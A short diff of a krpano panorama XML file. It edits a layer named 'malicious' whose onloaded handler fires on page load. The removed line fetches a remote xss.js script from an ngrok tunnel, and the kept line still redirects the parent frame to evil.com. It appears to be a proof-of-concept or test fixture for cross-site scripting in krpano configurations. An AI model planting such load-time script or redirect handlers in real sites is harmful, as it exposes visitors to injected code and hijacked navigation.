@@ -3,5 +3,5 @@
     <layer name="malicious" 
            type="container" 
            visible="true" 
-           onloaded="loadjs('https://5a71-2402-1980-873-3e77-2828-3f78-63fa-54de.ngrok-free.app/xss.js');openurl('https://evil.com', _parent);"/>
+           onloaded="openurl('https://evil.com', _parent);"/>
 </krpano>
